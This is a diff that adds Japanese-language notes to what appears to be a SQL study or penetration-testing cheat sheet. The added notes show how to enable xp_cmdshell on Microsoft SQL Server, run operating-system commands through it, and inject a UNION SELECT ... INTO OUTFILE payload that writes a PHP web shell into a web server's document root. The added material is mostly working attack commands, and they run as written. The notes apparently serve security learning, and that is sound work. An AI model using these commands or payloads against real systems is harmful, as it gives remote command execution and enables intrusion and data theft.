@@ -35,3 +35,22 @@ SELECT 列名1, 列名2, ・・・ FROM テーブル名
 ```
 USE <DB Name>
 ```
+
+- show advanced optionsの値を1にしてオプションの表示を有効化。
+- xp_cmdshellを有効化する
+```
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+xp_cmdshellを使ってコマンドシェル経由のコマンド実行を行う
+```
+EXECUTE xp_cmdshell 'whoami';
+```
+
+UNION SELECT SQLキーワードを発行してPHPのウェブシェルをターゲットのルートディレクトリ配下に書き込む
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
